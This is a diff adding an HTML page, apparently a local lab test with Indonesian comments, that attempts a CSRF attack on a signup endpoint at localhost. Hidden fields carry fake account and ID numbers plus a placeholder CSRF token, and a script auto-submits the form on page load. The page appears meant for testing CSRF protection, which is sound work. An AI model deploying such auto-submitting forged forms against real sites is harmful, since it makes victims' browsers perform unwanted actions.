@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Attempt (With CSRF Protection)</title>
+</head>
+<body>
+    <h2>CSRF Attack Attempt</h2>
+    <form action="http://localhost:3002/signup" method="POST" id="csrfForm">
+        <!-- Menyertakan email yang digunakan untuk signup -->
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="hidden" name="password" value="password123">
+        <input type="hidden" name="nama" value="Attacker">
+        <input type="hidden" name="nomor_hp" value="08123456789">
+        <input type="hidden" name="alamat_web" value="http://attacker.com">
+        <input type="hidden" name="tempat_lahir" value="Jakarta">
+        <input type="hidden" name="tanggal_lahir" value="1990-01-01">
+        <input type="hidden" name="no_kk" value="1234567890123456">
+        <input type="hidden" name="no_ktp" value="1234567891234567">
+
+        <!-- Menyertakan CSRF Token yang Valid -->
+        <!-- Dalam hal ini, token "A001" adalah contoh, harus diambil dari sesi pengguna atau mekanisme lain -->
+        <input type="hidden" name="_csrf" value="A001"> <!-- Token yang valid yang diharapkan oleh server -->
+
+    </form>
+
+    <script>
+        // Script ini mencoba mengirimkan form dengan token yang valid jika CSRF Token sah.
+        // Secara otomatis submit form setelah halaman dimuat.
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
